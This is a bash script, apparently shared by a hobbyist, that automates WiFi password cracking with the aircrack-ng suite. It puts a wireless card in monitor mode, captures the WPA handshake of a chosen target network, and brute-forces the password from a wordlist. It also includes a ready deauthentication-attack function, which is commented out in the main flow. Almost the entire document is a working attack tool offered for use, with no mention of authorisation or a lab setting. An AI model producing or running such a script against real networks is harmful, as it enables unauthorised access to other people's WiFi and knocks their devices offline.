#!/bin/bash

# WiFi Brute-Force Script
# Author: [Alikay_h]
# Date: [2025/10/15]

# ASCII Banner
cat << "EOF"
 _  __           _   _    ____ _   _  ____
| |/ /__ _ _   _| | | |  / ___| \ | |/ ___|
| ' // _` | | | | |_| | | |  _|  \| | |  _
| . \ (_| | |_| |  _  | | |_| | |\  | |_| |
|_|\_\__,_|\__, |_| |_|  \____|_| \_|\____|
          _|___/
       _(_)/ _(_)  ___(_) ___| | _| |_ ___ _ __
__  _(_)/ | |_| | / __| |/ __| |/ / __/ _ \ '__|
\ \ /\ / | |  _| | \__ \ | (__|   <| ||  __/ |
 \ V  V /| |_| |_| |___/_|\___|_|\_\\__\___|_|
  \_/\_/ |_|_| |_| |___/_|\___|_|\_\\__\___|_|
EOF

# Function to display usage information
usage() {
    echo "Usage: $0"
    echo "This script performs a brute-force attack on a WiFi network using Aircrack-ng."
    echo "It requires the following inputs:"
    echo "  - Wireless interface (e.g., wlan0)"
    echo "  - Target BSSID"
    echo "  - Channel number"
    echo "  - Path to wordlist"
    exit 1
}

# Function to check if a command exists
command_exists() {
    command -v "$1" &> /dev/null
}

# Function to put interface in monitor mode
start_monitor_mode() {
    echo "Putting $INTERFACE in monitor mode..."
    sudo airmon-ng start $INTERFACE
    MONITOR_INTERFACE="${INTERFACE}mon"
    if [ $? -ne 0 ]; then
        echo "Failed to put $INTERFACE in monitor mode."
        exit 1
    fi
}

# Function to scan for networks
scan_networks() {
    echo "Scanning for available networks..."
    sudo airodump-ng $MONITOR_INTERFACE
    if [ $? -ne 0 ]; then
        echo "Failed to scan for networks."
        exit 1
    fi
}

# Function to capture handshake
capture_handshake() {
    echo "Capturing handshake for BSSID $TARGET_BSSID on channel $CHANNEL..."
    sudo airodump-ng --bssid $TARGET_BSSID --channel $CHANNEL --write $CAPTURE_FILE $MONITOR_INTERFACE
    if [ $? -ne 0 ]; then
        echo "Failed to capture handshake."
        exit 1
    fi
}

# Function to crack the password
crack_password() {
    echo "Cracking the password using wordlist $WORDLIST..."
    aircrack-ng -w $WORDLIST $CAPTURE_FILE
    if [ $? -ne 0 ]; then
        echo "Failed to crack the password."
        exit 1
    fi
}

# Function to stop monitor mode
stop_monitor_mode() {
    echo "Stopping monitor mode..."
    sudo airmon-ng stop $MONITOR_INTERFACE
    if [ $? -ne 0 ]; then
        echo "Failed to stop monitor mode."
        exit 1
    fi
}

# Function to check for root privileges
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo "Please run as root"
        exit 1
    fi
}

# Function to validate BSSID format
validate_bssid() {
    local bssid=$1
    if ! [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        echo "Invalid BSSID format: $bssid"
        exit 1
    fi
}

# Function to validate channel number
validate_channel() {
    local channel=$1
    if ! [[ $channel =~ ^[1-9][0-9]*$ ]] || [ $channel -lt 1 ] || [ $channel -gt 165 ]; then
        echo "Invalid channel number: $channel"
        exit 1
    fi
}

# Function to validate wordlist path
validate_wordlist() {
    local wordlist=$1
    if [ ! -f $wordlist ]; then
        echo "Wordlist file not found: $wordlist"
        exit 1
    fi
}

# Function to prompt user for inputs
prompt_user() {
    read -p "Enter your wireless interface (e.g., wlan0): " INTERFACE
    read -p "Enter the target BSSID: " TARGET_BSSID
    read -p "Enter the channel number: " CHANNEL
    read -p "Enter the path to your wordlist: " WORDLIST
    CAPTURE_FILE="capture-01.cap"
}

# Function to perform deauthentication attack
deauth_attack() {
    local target_mac=$1
    local ap_mac=$2
    local interface=$3
    echo "Performing deauthentication attack on $target_mac..."
    sudo aireplay-ng --deauth 10 -a $ap_mac -c $target_mac $interface
    if [ $? -ne 0 ]; then
        echo "Failed to perform deauthentication attack."
        exit 1
    fi
}

# Function to display progress
display_progress() {
    local message=$1
    local total=$2
    local current=$3
    local percentage=$((current * 100 / total))
    echo -ne "[$message] $percentage% completed\r"
}

# Function to log activity
log_activity() {
    local message=$1
    echo "$(date): $message" >> activity.log
}

# Main script execution
main() {
    # Check for root privileges
    check_root

    # Check if required tools are installed
    if ! command_exists airodump-ng; then
        echo "Aircrack-ng could not be found. Please install it and try again."
        exit 1
    fi

    # Prompt user for inputs
    prompt_user

    # Validate inputs
    validate_bssid $TARGET_BSSID
    validate_channel $CHANNEL
    validate_wordlist $WORDLIST

    # Put interface in monitor mode
    start_monitor_mode

    # Scan for networks (optional, for manual verification)
    scan_networks

    # Capture the handshake
    capture_handshake

    # Perform deauthentication attack (optional)
    # deauth_attack "00:11:22:33:44:55" "66:77:88:99:AA:BB" $MONITOR_INTERFACE

    # Crack the password
    crack_password

    # Stop monitor mode
    stop_monitor_mode

    # Log completion
    log_activity "WiFi brute-force attack completed."

    echo "WiFi brute-force attack completed."
}

# Execute the main function
main
